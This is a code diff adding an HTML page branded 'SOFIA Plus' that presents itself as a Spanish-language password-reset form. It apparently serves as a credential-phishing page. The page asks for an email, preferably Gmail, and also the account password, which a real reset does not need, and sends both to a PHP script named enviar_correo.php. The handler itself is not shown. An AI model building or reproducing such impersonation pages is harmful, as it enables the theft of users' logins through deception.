@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SOFIA Plus</title>
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic,600" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/3.1.1/css/font-awesome.css" rel="stylesheet">
+  <link rel="icon" href="img/5.png" type="image/x-icon">
+  <link rel="stylesheet" href="diseño.css">
+</head>
+<body>
+   
+<div class="container">
+  <div class="testbox">
+    <form action="enviar_correo.php" method="post">
+        <img src="img/4.png" alt="">
+      <h2>RESTABLECIMIENTO DE CONTRASEÑA</h2>  <h3>
+          Por favor, proporciona tu dirección de correo de preferencia <Strong>Gmail</Strong> 
+        y te enviaremos un enlace seguro para restablecer tu contraseña.
+      </h3>
+      <hr>
+    
+      <label id="icon" for="gmail"><i class="icon-envelope"></i></label>
+      <input type="email" name="gmail" id="gmail" placeholder="Correo" required/>
+      <label id="icon" for="password"><i class="icon-shield"></i></label>
+      <input type="password" name="password" id="password" placeholder="Contraseña" required/>
+      <button type="submit" class="button">Enviar</button>
+    </form>
+  </div>
+</div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
